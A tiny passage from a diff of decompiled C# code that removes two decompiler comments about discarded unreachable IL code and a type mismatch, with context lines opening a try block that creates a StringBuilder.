-		//Discarded unreachable code: IL_007d, IL_0090
-		//IL_0087: Expected O, but got I4
 		try
 		{
 			StringBuilder stringBuilder = new StringBuilder();
